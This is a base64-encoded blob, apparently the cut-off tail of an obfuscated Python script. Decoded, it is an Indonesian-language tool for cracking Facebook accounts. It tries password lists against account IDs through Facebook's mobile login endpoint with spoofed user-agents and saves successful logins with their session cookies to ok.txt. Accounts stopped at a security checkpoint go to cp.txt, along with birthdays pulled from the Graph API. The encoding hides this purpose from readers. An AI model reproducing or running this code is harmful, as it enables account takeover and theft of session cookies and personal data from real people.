9fXykpKQ0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgl1YSA9IHJhbmRvbS5jaG9pY2UodWdlbikNCgl1YTIgPSByYW5kb20uY2hvaWNlKHVnZW4yKQ0KCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCWZvciBwdyBpbiBwd3g6DQoJCXRpeCA9IHRpbWUudGltZSgpDQoJCXNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOidtLmZhY2Vib29rLmNvbScsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEyLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqW2luc2VydGVkIGJ5IGN5dGhvbiB0byBhdm9pZCBjb21tZW50IGNsb3Nlcl0vW2luc2VydGVkIGJ5IGN5dGhvbiB0byBhdm9pZCBjb21tZW50IHN0YXJ0XSo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJkbnQiOiIxIiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLCJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwicmVmZXJlciI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44In0pDQoJCXAgPSBzZXMuZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYnKS50ZXh0DQoJCWRhdGFhID17ImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIocCkpLmdyb3VwKDEpLCJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIocCkpLmdyb3VwKDEpLCJ1aWQiOnVpZCwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnB3LCJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8ifQ0KCQlzZXMuaGVhZGVycy51cGRhdGUoeyJIb3N0IjonbS5mYWNlYm9vay5jb20nLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL20uZmFjZWJvb2suY29tIiwiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCpbaW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgY2xvc2VyXS9baW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgc3RhcnRdKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLCJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5Iiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYiLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgifSkNCgkJcG8gPSBzZXMucG9zdCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCcsZGF0YT1kYXRhYSxhbGxvd19yZWRpcmVjdHM9RmFsc2UpDQoJCWlmICJjX3VzZXIiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOg0KCQkJa3VraXMgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCgkJCV9fX19fX0FybXN0eV9fX19fXygiXHIgJXNbT0tdICVzIOKAoiAlcyDigKIgJXMgICAgICAgICAiJShILHVpZCwgcHcsa3VraXMpKQ0KCQkJb2suYXBwZW5kKCIlcyDigKIgJXMiJSh1aWQsIHB3KSkNCgkJCW9wZW4oIm9rLnR4dCIsImEiKS53cml0ZSgiIFtPS10gJXMg4oCiICVzIOKAoiAlc1xuIiUodWlkLCBwdyxrdWtpcykpDQoJCQlicmVhaw0KCQllbGlmICJjaGVja3BvaW50IiBpbiBwby5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOg0KCQkJdHJ5Og0KCQkJCXRva2VuPW9wZW4oImxvZ2luLnR4dCIsInIiKS5yZWFkKCkNCgkJCQl0dGwgPSBzZXMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMiJSh1aWQsIHRva2VuKSkuanNvbigpWyJiaXJ0aGRheSJdDQoJCQkJbW9udGgsIGRheSwgeWVhciA9IHR0bC5zcGxpdCgiLyIpDQoJCQkJbW9udGggPSBidWxhblttb250aF0NCgkJCQlfX19fX19Bcm1zdHlfX19fX18oIlxyICVzXHgxYlsxOzkzbVtDUF0gJXMg4oCiICVzIOKAoiAlcyAlcyAlcyIlKEssdWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpDQoJCQkJY3AuYXBwZW5kKCIlcyDigKIgJXMiJSh1aWQsIHB3KSkNCgkJCQlvcGVuKCJjcC50eHQiLCJhIikud3JpdGUoIiAgKiAtLT4gJXMg4oCiICVzIOKAoiAlcyAlcyAlc1xuIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpDQoJCQkJYnJlYWsNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCWRheSA9ICgiICIpDQoJCQkJbW9udGggPSAoIiAiKQ0KCQkJCXllYXIgPSAoIiAiKQ0KCQkJZXhjZXB0OnBhc3MNCgkJCV9fX19fX0FybXN0eV9fX19fXygiXHIgJXNceDFiWzE7OTNtW0NQXSAlcyDigKIgJXMgICAgICAgICAiJShLLHVpZCwgcHcpKQ0KCQkJY3AuYXBwZW5kKCIlcyDigKIgJXMiJSh1aWQsIHB3KSkNCgkJCW9wZW4oImNwLnR4dCIsImEiKS53cml0ZSgiICAqIC0tPiAlcyDigKIgJXNcbiIlKHVpZCwgcHcpKQ0KCQkJYnJlYWsNCgkJZWxzZToNCgkJCWNvbnRpbnVlDQoNCglfX19fX19fbG9vcF9fX19fXyArPSAxDQojIyMgU0VUVElORyBVQQ0KZGVmIF9fdXNlcmFnZW50X18oKToNCglfX19fX19Bcm1zdHlfX19fX18oZiIgXG4ge1B9W3tIfTF7UH1dIEdhbnRpIFVzZXJBZ2VudCBNYW51YWwiKQ0KCV9fX19fX0FybXN0eV9fX19fXyhmIiB7UH1be0h9MntQfV0gR3VuYWthbiBVc2VyQWdlbnQgVG9vbHMiKQ0KCXVhID0gX19fX19fQXJtc3R5R2Fuc19fX19fXyhmIiB7UH1be0h9P3tQfV0gQ2hvb3NlIDogIikNCglpZiB1YSA9PSIiOg0KCQlfX19fX19MdVdpYnVfX19fX18oZiIge1B9W3tIfSF7UH1dIFBpbGloYW4gVGlkYWsgQWRhIikNCgllbGlmIHVhID09ICIxIjoNCgkJY191YSA9IF9fX19fX0FybXN0eUdhbnNfX19fX18oZiIgXG4ge1B9W3tIfT97UH1dIEVudGVyIFVzZXItQWdlbnQgOiAiKQ0KCQlvcGVuKCIudWEiLCAidyIpLndyaXRlKGNfdWEpDQoJCXRpbWUuc2xlZXAoMSkNCgkJX19fX19fQXJtc3R5R2Fuc19fX19fXyhmIiBcbiB7UH1be0h94pyUe1B9XSBQcmVzcyBFbnRlciBUbyBTYXZlIFVzZXItQWdlbnQiKQ0KCQlfX19TYXlhUmVjb2RlU2FtcGFoX19fKCkNCgllbGlmIHVhID09ICIyIjoNCgkJX19fX19fQXJtc3R5X19fX19fKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIpDQoJCV9fX19fX1NBWUFOR0tBTVVfX19fX18oInJtIC1mIC51YSIpDQoJCXRpbWUuc2xlZXAoMSkNCgkJX19fX19fQXJtc3R5R2Fuc19fX19fXyhmIiBcbiB7UH1be0h9P3tQfV0gVXNlci1BZ2VudCBTYXZlIFN1Y2Nlc3NmdWxseSIpDQoJCV9fX1NheWFSZWNvZGVTYW1wYWhfX18oKQ0KCQkNCmRlZiBfX19TYXlhUmVjb2RlU2FtcGFoX19fKCk6DQoJX19fX19fU0FZQU5HS0FNVV9fX19fXygnY2xlYXInKQ0KCWdsb2JhbCB0b2tlbg0KCXRyeToNCgkJdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCV9fX19fX0FybXN0eV9fX19fXyhmJ3tQfSBbe0h9IXtQfV0gWW91IFRoaXMgSWRpb3QgVG9rZW4gSW52YWxpZCcpDQoJCV9fX19fX1NBWUFOR0tBTVVfX19fX18oJ2NsZWFyJykNCgkJX19fX19fU0FZQU5HS0FNVV9fX19fXygncm0gLXJmIGxvZ2luLnR4dCcpDQoJCV9fX1JlY29kZVNhbXBhaF9fKCkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCV9fX19fX0x1V2lidV9fX19fXyhmJ3tQfSBbe019IXtQfV0gTm8gQ29ubmVjdGlvbicpDQoJdHJ5Og0KCQluYW1hID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpLmpzb24oKVsnbmFtZSddDQoJCXVpZCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKS5qc29uKClbJ2lkJ10NCglleGNlcHQgS2V5RXJyb3I6DQoJCV9fX19fX1NBWUFOR0tBTVVfX19fX18oJ2NsZWFyJykNCgkJX19fX19fQXJtc3R5X19fX19fKGYne1B9IFt7TX3Dl3tQfV0gWW91IFRoaXMgSWRpb3QgVG9rZW4gSW52YWxpZCcpDQoJCV9fX19fX1NBWUFOR0tBTVVfX19fX18oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQlfX19SZWNvZGVTYW1wYWhfXygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlfX19fX19MdVdpYnVfX19fX18oZid7UH0gW3tNfSF7UH1dIE5vIENvbm5lY3Rpb24nKQ0KCV9fX19fX19fTE9HT1NDUklQVE5ZQV9fX19fX19fX18oKQ0KCV9fX19fX0FybXN0eV9fX19fXyhmIiB7UH1be0h9LT57UH1dIE5hbWEgICAgOiAlcyBcbiB7UH1be0h9LT57UH1dIElEICAgICAgOiAlcyBcbiB7UH1be0h9LT57UH1dIElQICAgICAgOiAlcyBcbiB7UH1be0h9LT57UH1dIFN0YXR1cyAgOiB7SH1GUkVFe1B9IiUobmFtYSx1aWQsX19fX19fX0lQX19fX19fXykpDQoJX19fX19fQXJtc3R5X19fX19fKGYiIFxuIHtQfVt7SH0xe1B9XSBDcmFjayBQdWJsaWMgSUQgXG4ge1B9W3tIfTJ7UH1dIENoZWNrIENyYWNrZWQgT0svQ1AgXG4ge1B9W3tIfTN7UH1dIFNldHRpbmcgVXNlckFnZW50IFxuIHtQfVt7SH00e1B9XSBVcGdyYWRlIHtIfVBybyBcbiB7UH1be0h9MHtQfV0gUmVtb3ZlIFRva2VuIChMb2dvdXQpIikNCglhc2sgPSBfX19fX19Bcm1zdHlHYW5zX19fX19fKGYiIHtQfVt7VX0/e1B9XSBTZWxlY3QgOiAiKQ0KCWlmIGFzayA9PSIiOl9fX19fX0x1V2lidV9fX19fXyhmIiB7UH1be0h9IXtQfV0gUGlsaWhhbiBUaWRhayBBZGEiKQ0KCWVsaWYgYXNrIGluIFsnMScsJzAxJywnMDAxJywnYSddOl9fX19fUHVibGljX19fX19fXygpDQoJZWxpZiBhc2sgaW4gWycyJywnMDInLCcwMDInLCdiJ106X19jZWtha3VuX18oKQ0KCWVsaWYgYXNrIGluIFsnMycsJzAzJywnMDAzJywnYyddOl9fdXNlcmFnZW50X18oKQ0KCWVsaWYgYXNrIGluIFsnNCcsJzA0JywnMDA0JywnZCddOl9fdXBncmFkZV9fKCkNCgllbGlmIGFzayBpbiBbJzAnLCcwMCcsJzAwMCcsJ2UnXTpfX19fX19TQVlBTkdLQU1VX19fX19fKCJybSAtZiBsb2dpbi50eHQiKTtfX19fX19Bcm1zdHlfX19fX18oZiIge1B9W3tIfeKclHtQfV0gU3VjY2Vzc2Z1bGx5IERlbGV0ZSBUb2tlbiIpO19fX19fX0x1V2lidV9fX19fXygpDQoJZWxzZTpfX19fX19MdVdpYnVfX19fX18oZiIge1B9W3tIfSF7UH1dIFBpbGloYW4gVGlkYWsgQWRhIikNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCglpZiBzeXMudmVyc2lvblswXSE9IjIiOg0KCQlweXRob249IjIuNyIgaWYgIjIuNyIgaW4gc3lzLnZlcnNpb25bMDoyXSBlbHNlICIyLjgiDQoJZWxzZToNCgkJX19fX19fTHVXaWJ1X19fX19fKCIgXDAzM1swOzk3bVtcMDMzWzA7OTFtIVwwMzNbMDs5N21dIEhvdyBUbyBVc2FnZSA6IHB5dGhvbiBydW4ucHkiKQ0KCV9fX19fX1NBWUFOR0tBTVVfX19fX18oImdpdCBwdWxsIikNCglfX19SZWNvZGVTYW1wYWhfXygp'))
